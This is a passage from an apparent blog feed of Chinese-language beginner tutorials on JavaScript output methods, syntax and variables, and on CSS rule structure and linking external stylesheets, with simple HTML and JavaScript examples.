punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>说明：</strong>那些老旧的实例可能会在 <code>&lt;script&gt;</code> 标签中使用 <code>type=&quot;text/javascript&quot;</code>。现在已经不必这样做了。JavaScript 是所有现代浏览器以及 HTML5 中的默认脚本语言。</p></blockquote><br><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（3） 关于注释</strong></font></p><ol><li><p>C/C++/C#/Java/JavaScript：单行使用<strong><code>//</code></strong>,多行使用<strong><code>/*...*/</code></strong></p></li><li><p>MYSQL/Python：<strong><code>#</code></strong></p></li><li><p>PHP：单行使用<strong><code>//</code></strong>，多行使用三对单引号或者双引号</p></li><li><p>CSS：<strong><code>/*...*/</code></strong></p></li><li><p>HTML：<strong><code>&lt;!--注释内容--&gt;</code></strong></p></li></ol><br><br><h4 id="1-3-JavaScript-输出"><font color="#3CB371" face="Comic sans MS">1.3 JavaScript 输出</font><a href="post/JavaScript#1-3-JavaScript-输出"></a></h4><blockquote><p><font color="#FF7F00"><strong>JavaScript 显示数据</strong></font></p><ol><li>使用 window.alert() 弹出警告框。</li><li>使用 document.write() 方法将内容写到 HTML 文档中。</li><li>使用 innerHTML 写入到 HTML 元素。</li><li>使用 console.log() 写入到浏览器的控制台。</li></ol></blockquote><br><p><font face="Microsoft YaHei" color="#00B2EE"><strong>（1） window.alert(str) 弹出警告框</strong></font></p><blockquote><p><font color="#FF7F00"><strong>描述：</strong></font>在当前窗口中弹出一个警告对话框，str为对话框中显示的内容。<br>window：代表当前浏览器窗口，window是一个窗口对象。<br>alert()：弹出一个对话框。<br>str：表示要输出的内容。</p></blockquote><br><p>实例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>来试一波<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2019/03/12/5c877dd02cfeb.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>我的第一个页面<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>我的第一个段落。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/12/5c877e7a8a039.png" alt="1.png" data-zoomable></p></div><br><p><font face="Microsoft YaHei" color="#00B2EE"><strong>（2） document.write(str) 写到 HTML 文档</strong></font></p><blockquote><p><font color="#FF7F00"><strong>描述：</strong></font></p><ol><li>document意思“文档”，就是整个网页了。</li><li>document是一个文档对象，代表整个网页。</li><li>write()是document对象的一个输出方法。</li><li>“.”小数点：通过小数点(.)来调用对象的方法。</li><li>str：表示要输出的内容。</li></ol></blockquote><p><strong>注意事项：</strong></p><ol><li>请使用 document.write() 仅仅向文档输出写内容。</li><li>如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。</li></ol><br><p>下面实例说明document.write()在文档加载完后执行将会覆盖之前的页面：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>点击“点我”前的页面<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>这是“点我”前的页面Web 页面<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>我的第一个段落。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myFunction()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>点我<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token keyword">function</span> <span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>在没有点击“点我”前的页面：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/12/5c8785a1aca7f.png" alt="3.png" data-zoomable></p></div><p><br>在点击“点我”后的页面：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/12/5c8785a5c3ea4.png" alt="4.png" data-zoomable></p></div><br><p><font face="Microsoft YaHei" color="#00B2EE"><strong>（3） innerHTML 操作 HTML 元素</strong></font></p><blockquote><p><font color="#FF7F00"><strong>描述：</strong></font></p><ol><li>innerHTML用于操作 HTML 元素。</li><li>如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(id) 方法。</li><li>请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：</li></ol></blockquote><p>实例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>再来试一波<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2019/03/12/5c8780490c44e.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>我的第一个 Web 页面<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>我的第一个段落。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"段落已修改。"</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/12/5c87808ae6e21.png" alt="2.png" data-zoomable></p></div><p><strong>说明：</strong>以上 JavaScript 语句（在 <code>&lt;script&gt;</code> 标签中）可以在 web 浏览器中执行：</p><ol><li><strong><code>document.getElementById(&quot;demo&quot;)</code> ：</strong>是使用 <code>id</code> 属性来查找 HTML 元素的 JavaScript 代码 。</li><li><strong><code>innerHTML = &quot;段落已修改。&quot;</code>：</strong> 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。</li></ol><br><p><font face="Microsoft YaHei" color="#00B2EE"><strong>（4） console.log() 写到控制台。</strong></font></p><p>如果您的浏览器支持调试，你可以使用 console.log() 方法在浏览器中显示 JavaScript 值。</p><p>浏览器中使用 F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单。</p><p><strong>Tip：</strong>程序中调试是测试，查找及减少bug(错误)的过程。</p><br><p>下面实例代码先写到一个 .html的文档里，然后在浏览器运行这个文档。运行后启用调试模式点击”Console” 菜单即可看到输出结果：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>输出到控制台<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2019/03/12/5c8787ce408d7.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>注意要启动调试模式<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>浏览器中<span class="token punctuation">(</span>Chrome<span class="token punctuation">,</span> <span class="token constant">IE</span><span class="token punctuation">,</span> Firefox<span class="token punctuation">)</span> 使用 <span class="token constant">F12</span> 来启用调试模式， 在调试窗口中点击 <span class="token string">"Console"</span> 菜单。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>a <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/12/5c8788a01fd0b.png" alt="5.png" data-zoomable></p></div><br><br><h3 id="二-JavaScript-语法"><font color="#FF6347" face="Comic sans MS">二. JavaScript 语法</font><a href="post/JavaScript#二-JavaScript-语法"></a></h3><br><h4 id="2-1-基本法则"><font color="#3CB371" face="Comic sans MS">2.1 基本法则</font><a href="post/JavaScript#2-1-基本法则"></a></h4><blockquote><ol><li><strong>声明变量：</strong>使用关键字<strong><code>var</code></strong>，如：<code>var name; var num=12;</code></li><li><strong>命名规则：</strong>变量名不能以数字开头，可以是字母或下划线开头。变量名可以包含字母、数字、下划线。</li><li><strong>大小写敏感：</strong>JS中的变量名是区分大小写的。</li><li><strong>驼峰式命名：</strong>第一个单词全小写，后面的每一个单词首字母大写。如：<strong><code>var  getUserName;</code></strong></li><li><strong>语句块：</strong>花括号<strong><code>{...}</code></strong>，JavaScript的语法和Java语言类似</li><li><strong>语句结束符：</strong>英文分号<strong><code>;</code></strong>，JavaScript的语法和Java语言类似</li><li><strong>缩进：</strong>花括号{…}内的语句具有缩进，通常是4个空格，并不强制使用。缩进有助于我们理解代码的层次。</li><li><strong>注释：</strong>单行<strong><code>//</code></strong>，多行<strong><code>/*...*/</code></strong>，不是所有的 JavaScript 语句都是”命令”。</li><li><strong>空格：</strong>JavaScript 会忽略多余的空格。可以向脚本添加空格，来提高其可读性。</li><li><strong>一行：</strong>一行代码可包含多个语句，每个语句用<strong><code>;</code></strong>表示语句结束。但 不建议一行写多个语句!（因为要层次感）</li><li><strong>多行：</strong>文本字符串中使用反斜杠<strong><code>\</code></strong>对代码行进行换行。但是只能字符串使用，变量名函数名等其他不能使用。</li></ol></blockquote><p>如：<br><code>document.write(&quot;你好 \</code><br><code>世界!&quot;);</code></p><p><strong>提示：</strong>JavaScript 是脚本语言。浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。</p><br><p><font color="#FF7F00"><strong>Tip1：</strong></font>以下是 JavaScript 中最​​重要的保留字（按字母顺序）：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/12/5c87933bee96c.png" alt="6.png" data-zoomable></p></div><br><p><font color="#FF7F00"><strong>Tip2：</strong></font>JavaScript 有多种数据类型：数字，字符串，数组，对象等等（在编程语言中，一般固定值称为字面量，如 3.14。）：</p><p><font color="#FF7F00"></font></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> length <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>                                  <span class="token comment" spellcheck="true">// Number 通过数字字面量赋值 </span><span class="token keyword">var</span> points <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">// Number 通过表达式字面量赋值</span><span class="token keyword">var</span> lastName <span class="token operator">=</span> <span class="token string">"Johnson"</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// String 通过字符串字面量赋值</span><span class="token keyword">var</span> cars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Saab"</span><span class="token punctuation">,</span> <span class="token string">"Volvo"</span><span class="token punctuation">,</span> <span class="token string">"BMW"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// Array  通过数组字面量赋值</span><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>firstName<span class="token punctuation">:</span><span class="token string">"John"</span><span class="token punctuation">,</span> lastName<span class="token punctuation">:</span><span class="token string">"Doe"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Object 通过对象字面量赋值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#FF7F00"><strong>Tip3：</strong></font>JavaScript 语句通常以一个 语句标识符 为开始，并执行该语句。语句标识符是保留关键字不能作为变量名使用。</p><p>下表列出了 JavaScript 语句标识符 (关键字) ：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/12/5c87953d930f2.png" alt="7.png" data-zoomable></p></div><p><font color="#FF7F00"></font></p><br><h4 id="2-2-变量和数据类型"><font color="#3CB371" face="Comic sans MS">2.2 变量和数据类型</font><a href="post/JavaScript#2-2-变量和数据类型"></a></h4><br><p><font face="Microsoft YaHei" color="#00B2EE"><strong>（1） 变量</strong></font></p><p>变量是有数据类型的，这个类型来源于“变量的值”，换句话说：值是什么类型的，变量就是什么类型的。</p><p>这种变量本身类型不固定的语言称之为动态语言，与之对应的是静态语言。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下：</p><p>int a = 123; // a是整数类型变量，类型用int申明a = “ABC”; // 错误：不能把字符串赋给整型变量</p><p>和静态语言相比，动态语言更灵活，就是这个原因。</p><blockquote><p><font color="#FF7F00"><strong>变量命名规则：</strong></font></p><ol><li>变量必须以字母开头</li><li>变量也能以 $ 和 _ 符号开头（不过我们不推荐这么做）</li><li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li></ol></blockquote><br><p>您可以在一条语句中声明很多变量。该语句以 var 开头，并使用逗号分隔变量即可：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> lastname<span class="token operator">=</span><span class="token string">"Doe"</span><span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> job<span class="token operator">=</span><span class="token string">"carpenter"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>声明也可横跨多行：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> lastname<span class="token operator">=</span><span class="token string">"Doe"</span><span class="token punctuation">,</span>age<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>job<span class="token operator">=</span><span class="token string">"carpenter"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是一条语句中声明的多个不可以赋同一个值（x,y 为 undefined， z 为 14。）：）:</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p><font face="Microsoft YaHei" color="#00B2EE"><strong>（2） 数据类型</strong></font></p><p><font color="#FF7F00"><strong>JS中八种数据类型：</strong></font>Number（数值型）、String（字符串）、bool（布尔型）、undefined、null、array、object、function</p><p>这八种数据类型，又分为两大类：</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 基础</title>
      <link href="/post/HTML-CSS/"/>
      <url>/post/HTML-CSS/</url>
      
        <content type="html"><![CDATA[<p>hhh… ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">CSS 基础</font> </center><br><br><h3 id="一-CSS-初识"><font color="#FF6347" face="Comic sans MS">一. CSS 初识</font><a href="post/HTML-CSS#一-CSS-初识"></a></h3><br><p><font face="Microsoft YaHei"><strong>CSS是给HTML标记加的样式；JS是给HTML标记加的行为。HTML标记是最先出现的。</strong></font></p><blockquote><ol><li>CSS是什么?</li><li>为什么要使用CSS?</li><li>CSS和HTML是什么关系？</li><li>CSS应该怎样使用？</li></ol></blockquote><br><p><font color="#00B2EE"><strong>1. CSS是什么?</strong></font></p><ol><li><p>CSS（Cascading Stylesheets，层叠样式表）。</p></li><li><p><strong>CSS的主要目的：是</strong><font color="#FF7F00"><strong>给HTML标记添加各种各样的表现(格式、样式)</strong></font>。比如：文字样式、背景、文本样式、链接样式。</p></li><li><p>是一种制作网页的新技术，现在已经为大多数的浏览器所支持，成为网页设计必不可少的工具之一。使用CSS能够简化网页的格式代码，加快下载显示的速度，也减少了需要上传的代码数量，大大减少了重复劳动的工作量。尤其是当你面对的是有数百个网页的站点时，CSS简直象是神对我们的恩赐！</p></li></ol><br><p><font color="#00B2EE"><strong>2. 为什么要使用CSS?</strong></font></p><blockquote><p><font color="#FF7F00"><strong>HTML</strong>超文本标注语言</font>：各种HTML标记。<br><font color="#FF7F00"><strong>CSS</strong>层叠样式表</font>：给HTML标记加的样式。<br><font color="#FF7F00"><strong>JavaScript</strong>脚本程序</font>：给HTML标记加的程序。</p></blockquote><p>   W3C（The World Wide Web Consortium）把动态HTML（Dynamic HTML）分为三个部分来实现：脚本语言（包括javascript、Vbscript等）、支持动态效果的浏览器（包括Internet Explorer、Netscape Navigator等）和CSS样式表。</p><br><p><font color="#00B2EE"><strong>3. CSS和HTML是什么关系？</strong></font></p><p><strong>CSS的主要目的：是</strong><font color="#FF7F00"><strong>给HTML标记添加各种各样的表现(格式、样式)</strong></font>。比如：文字样式、背景、文本样式、链接样式。</p><br><p><font color="#00B2EE"><strong>4. CSS应该怎样使用？</strong></font></p><blockquote><ol><li>在HTML标签中直接使用。</li><li>在HTML标签先定义属性id或者class，然后在<strong><code>&lt;head&gt;&lt;/head&gt;</code></strong>定义一个样式表来表现这个属性id或者class。</li></ol></blockquote><p>CSS注释以 <strong><code>/*</code></strong> 开始, 以 <strong><code>*/</code></strong>  结束, 实例如下:</p><pre class="line-numbers language-css"><code class="language-css"><span class="token comment" spellcheck="true">/*这是个注释*/</span><span class="token selector">p</span><span class="token punctuation">{</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*这是另一个注释*/</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="二-CSS-框架"><font color="#FF6347" face="Comic sans MS">二. CSS 框架</font><a href="post/HTML-CSS#二-CSS-框架"></a></h3><p>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/10/5c84f57ee276a.png" alt="1.png" data-zoomable></p></div><br><p><font color="#FF7F00"><strong>选择器：</strong></font>就是选择HTML标记，换句话说：就是给哪个HTML标记加样式。<br><font color="#FF7F00"><strong>格式声明语句：</strong></font>由<strong><code>{ }</code></strong>构成，<strong><code>{ }</code></strong>中每条声明由<strong><code>属性名:属性值;</code></strong>构成。</p><p><font color="#FF7F00"></font></p><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>每个属性有一个值，属性和值被冒号<strong><code>:</code></strong>分开。属性和属性之间用英文分号<strong><code>；</code></strong>隔开。最后以分号<strong><code>；</code></strong>结束。</li><li>属性值，一个属性名可以取不同的值，这个值不加引号。</li><li>CSS中的数字单位都是<strong><code>px</code></strong>，这个<strong><code>px</code></strong>不能省略。</li></ol></blockquote><br><h4 id="2-1-CSS-样式"><font color="#3CB371" face="Comic sans MS">2.1 CSS 样式</font><a href="post/HTML-CSS#2-1-CSS-样式"></a></h4><p>要想在浏览器中显示出预期的CSS样式表效果，就要让浏览器识别并正确调用CSS。当浏览器读取样式表时，要依照文本格式来读，这里介绍四种在页面中插入CSS样式表的方法：<strong>链入外部样式表、内部样式表、导入外部样式表和内联样式</strong>。</p><br><h5 id="1-链入外部样式表"><font color="#00B2EE" face="Microsoft YaHei">1. 链入外部样式表</font><a href="post/HTML-CSS#1-链入外部样式表"></a></h5><p><strong>链入外部样式表：</strong>是把样式表（选择器+声明）保存为一个样式表<strong><code>.css</code></strong>文件，然后在页面中用<strong><code>&lt;link&gt;</code></strong>标记来链接到这个样式表文件，这个<strong><code>&lt;link&gt;</code></strong>标记必须放到页面的<strong><code>&lt;head&gt;...&lt;/head&gt;</code></strong>区内。</p><p>如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> …… <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mystyle.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>all<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> …… <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>上面这个例子表示浏览器从mystyle.css文件中以文档格式读出定义的样式表。<br><strong><code>href=&quot;mystyle.css&quot;</code></strong>是文件所在的位置。<br><strong><code>rel=&quot;stylesheet&quot;</code></strong>是指在页面中使用这个外部的样式表。rel 